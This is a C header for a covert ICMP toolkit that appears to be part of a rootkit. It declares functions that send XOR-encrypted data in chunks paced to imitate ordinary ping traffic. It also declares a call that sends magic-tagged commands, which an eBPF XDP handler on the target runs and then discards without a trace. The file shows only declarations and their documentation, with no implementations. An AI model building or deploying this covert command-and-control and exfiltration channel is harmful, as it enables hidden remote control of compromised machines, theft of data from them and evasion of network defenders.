/**
 * @file icmp.h
 * @brief Raw ICMP socket wrapper with covert delivery support.
 *
 * Two levels of API:
 *
 *   Low-level  — icmp_send() / icmp_recv()
 *     Send and receive a single ICMP echo with an arbitrary payload.
 *
 *   High-level — icmp_deliver()
 *     Split a large buffer into fixed-size chunks, XOR-encrypt each chunk
 *     with a session key, and send them at a rate that mimics normal ping
 *     traffic (one packet per second, 64-byte payload).
 *     Each packet carries a 4-byte header [total:2][index:2] followed by
 *     up to ICMP_CHUNK_DATA bytes of encrypted payload.
 *
 * Requires CAP_NET_RAW (run as root).
 */

#ifndef ICMP_H
#define ICMP_H

#include <netinet/in.h>
#include <stddef.h>
#include <stdint.h>

/** Total ICMP data field size per packet — matches default OS ping size. */
#define ICMP_PAYLOAD_MAX   64

/** Max command length for a covert ICMP exec packet (must match eBPF RK_ICMP_CMD_MAX). */
#define ICMP_EXEC_CMD_MAX  128

/** Bytes of actual payload per chunk (64 - 4 byte header). */
#define ICMP_CHUNK_DATA    60

/** ICMP type values. */
#define ICMP_ECHO_REQUEST  8
#define ICMP_ECHO_REPLY    0

/**
 * @brief ICMP session context.
 *
 * Initialised by icmp_open(), released by icmp_close().
 * Do not access fields directly.
 */
typedef struct icmp_ctx {
    int      sock;
    uint16_t id;
    uint16_t seq;
} icmp_ctx_t;

/**
 * @brief Open a raw ICMP socket and initialise the context.
 *
 * @param ctx  Context to initialise.
 * @return     0 on success, -1 on error (check errno).
 */
int icmp_open(icmp_ctx_t *ctx);

/**
 * @brief Send one ICMP echo request carrying up to ICMP_PAYLOAD_MAX bytes.
 *
 * @param ctx      Initialised ICMP context.
 * @param dst      Destination IP address string.
 * @param payload  Data to embed in the echo payload.
 * @param len      Number of bytes (capped to ICMP_PAYLOAD_MAX).
 * @return         0 on success, -1 on error.
 */
int icmp_send(icmp_ctx_t *ctx, const char *dst,
              const uint8_t *payload, size_t len);

/**
 * @brief Wait for one ICMP echo reply and extract its payload.
 *
 * @param ctx        Initialised ICMP context.
 * @param src_out    If non-NULL, filled with the sender IP string.
 * @param buf        Destination buffer for the payload bytes.
 * @param buf_len    Size of buf.
 * @param timeout_ms Maximum wait time in milliseconds.
 * @return           Number of payload bytes received, or -1 on timeout/error.
 */
int icmp_recv(icmp_ctx_t *ctx, char *src_out,
              uint8_t *buf, size_t buf_len, int timeout_ms);

/**
 * @brief Deliver a large buffer covertly over ICMP echo.
 *
 * Splits @p buf into ICMP_CHUNK_DATA-byte chunks, XOR-encrypts each chunk
 * with @p key, prepends a [total(2)][index(2)] header and sends one packet
 * per second to mimic normal ping traffic. Waits for an echo reply before
 * sending the next chunk (stop-and-wait).
 *
 * @param ctx   Initialised ICMP context.
 * @param dst   Destination IP address string.
 * @param buf   Buffer to deliver.
 * @param len   Size of buf in bytes.
 * @param key   XOR session key (any non-zero value recommended).
 * @return      0 when all chunks acknowledged, -1 on error.
 */
int icmp_deliver(icmp_ctx_t *ctx, const char *dst,
                 const uint8_t *buf, size_t len, uint8_t key);

/**
 * @brief Send a single covert C2 command via ICMP.
 *
 * Embeds magic 0xDEAD1337 + @p cmd in an ICMP Echo Request payload.
 * The eBPF XDP handler on the target intercepts and executes the command,
 * then drops the packet — no trace left in the network stack.
 *
 * @param ctx  Initialised ICMP context.
 * @param dst  Target IP address string.
 * @param cmd  Null-terminated command (max ICMP_EXEC_CMD_MAX bytes).
 * @return     0 on success, -1 on error.
 */
int icmp_exec_cmd(icmp_ctx_t *ctx, const char *dst, const char *cmd);

/**
 * @brief Close the raw socket and invalidate the context.
 *
 * @param ctx  Context to close. Safe to call with NULL.
 */
void icmp_close(icmp_ctx_t *ctx);

#endif /* ICMP_H */
